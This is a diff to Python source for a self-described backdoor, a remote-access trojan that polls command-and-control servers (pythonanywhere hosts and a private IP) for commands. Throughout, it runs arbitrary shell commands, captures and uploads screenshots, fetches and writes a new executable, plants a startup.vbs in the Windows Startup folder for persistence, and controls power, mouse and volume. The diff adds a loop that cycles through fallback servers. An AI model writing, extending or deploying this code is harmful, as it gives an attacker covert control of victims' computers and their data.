@@ -1,12 +1,16 @@
-import requests,time,os,keyboard,pyautogui,webbrowser
+import requests,time,os,keyboard,pyautogui,webbrowser,time
 
 class backdoor:
-    def __init__(self):
-        self.url = "https://pybackdoor.pythonanywhere.com/"
+    def __init__(self, url="http://127.0.0.1:8000/"):
+        self.url = url
         ip = requests.get("https://api64.ipify.org/").text
         self.id = requests.get(self.url+"api/get_id/"+ip).json()['id']
+        ping = "0ms"
         while True:
-            requests.get(self.url+"api/ping/"+str(self.id))
+            start = time.time()
+            requests.get(self.url+"api/ping/"+str(self.id)+"/"+ping)
+            end = time.time()
+            ping = str(round((end-start)*1000,2))
             commands = requests.get(self.url+"api/commands/"+str(self.id)).json()
             for i in commands:
                 output = self.run(commands[i])
@@ -71,7 +75,6 @@ class backdoor:
                     output += file_to_download + " does not exist \n"
 
             elif command.startswith("screenshot"):
-                print("screenshot")
                 myScreenshot = pyautogui.screenshot()
                 myScreenshot.save('screenshot.png')
                 sample_file = open("screenshot.png", "rb")
@@ -83,7 +86,7 @@ class backdoor:
                 for i in os.listdir():
                     output += i + "\n"
             elif command.startswith("update"):
-                name = command.split(" ")[1]
+                name = "main.exe"
                 get_response = requests.get(f"{self.url}media/files/main.exe")
                 with open(name, "wb") as out_file:
                     out_file.write(get_response.content)
@@ -98,25 +101,27 @@ class backdoor:
                 os.chdir("AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")
                 with open("startup.vbs","w+") as w:
                     w.write('Set shell = CreateObject("WScript.Shell")\n')
-                    w.write('shell.CurrentDirectory = "'+os.path.join(os.path.dirname(__file__),name)+'"\n')
-                    w.write(f'shell.Run "{name}.exe"')
+                    w.write('shell.CurrentDirectory = "'+os.path.dirname(__file__)+'"\n')
+                    w.write(f'shell.Run "{name}"')
                     w.close()
+                output += "Updated\n"
+                os.system("startup.vbs")
             elif command.startswith("power"):
                 power_command = command.split("(")
                 power_command_argument = power_command[1].replace(")", "")
                 power_command_argument = power_command_argument.replace('"', '')
                 power_command_argument = power_command_argument.replace("'", "")
                 if power_command_argument.lower() == "shutdown":
-                    os.system("shutdown /p")
                     output += "Shutting down the pc\n"
+                    os.system("shutdown /p")
                     continue
                 elif power_command_argument.lower() == "restart":
-                    os.system("shutdown /r")
                     output += "Restarting the pc\n"
+                    os.system("shutdown /r")  
                     continue
                 elif power_command_argument.lower() == "sleep":
-                    os.system("shutdown /l")
                     output += "Computer is going on sleep\n"
+                    os.system("shutdown /l")
                     continue
                 output += power_command_argument + " is a invalid argument, (shutdown, restart, sleep)\n"
             elif command.startswith("volume"):
@@ -173,6 +178,7 @@ class backdoor:
                         mouse_command_args = mouse_command_args.replace(")", "")
                         mouse_command_args = mouse_command_args.replace(" ", "")
                         mouse_command_args = mouse_command_args.split(",")
+                        output += "Clicked"
                         if len(mouse_command_args) > 1:
                             mouse_command_args = list(map(int,mouse_command_args))
                             pyautogui.click(mouse_command_args[0], mouse_command_args[1], button="right")
@@ -180,12 +186,14 @@ class backdoor:
                         else:
                             pyautogui.click()
                             continue
+                        
                     elif mouse_command.startswith("click"):
                         mouse_command_args = mouse_command.replace("click", "")
                         mouse_command_args = mouse_command_args.replace("(", "")
                         mouse_command_args = mouse_command_args.replace(")", "")
                         mouse_command_args = mouse_command_args.replace(" ", "")
                         mouse_command_args = mouse_command_args.split(",")
+                        output += "Clicked"
                         if len(mouse_command_args) > 1:
                             mouse_command_args = list(map(int,mouse_command_args))
                             pyautogui.click(mouse_command_args[0], mouse_command_args[1])
@@ -193,6 +201,7 @@ class backdoor:
                         else:
                             pyautogui.click()
                             continue
+                        
                     elif mouse_command.startswith("move"):
                         mouse_command_args = mouse_command.replace("move", "")
                         mouse_command_args = mouse_command_args.replace("(", "")
@@ -225,9 +234,21 @@ class backdoor:
                     else:
                         output += "Invalid command [click(),right_click(), move(), spam_click()\n"
             else:
+                output += " \n"
                 output += os.popen(command).read() + "\n"
+                
                 
 
         return output
+    
 
-backdoor()   
+while True:
+    try:
+        backdoor("https://pybdtest.pythonanywhere.com/") 
+    except:
+        pass
+    try: 
+        backdoor("http://10.2.100.100:8000/") 
+    except:
+        pass
+  
